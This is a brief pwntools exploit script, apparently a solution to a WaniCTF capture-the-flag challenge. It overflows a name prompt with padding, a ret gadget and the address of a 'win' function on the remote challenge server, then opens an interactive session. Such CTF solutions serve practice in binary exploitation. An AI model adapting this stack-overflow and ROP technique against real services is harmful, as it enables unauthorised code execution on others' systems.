from pwn import *

elf = ELF('./pwn05')
io = remote("ret.wanictf.org", 9005)
#io = process(elf.path)
rop = ROP(elf)

win = elf.symbols['win']
ret = (rop.find_gadget(['ret']))[0]

io.readuntil("What's your name?: ")

base = b'A' * 22
payload = base + p64(ret) + p64(win)
io.sendline(payload)
io.interactive()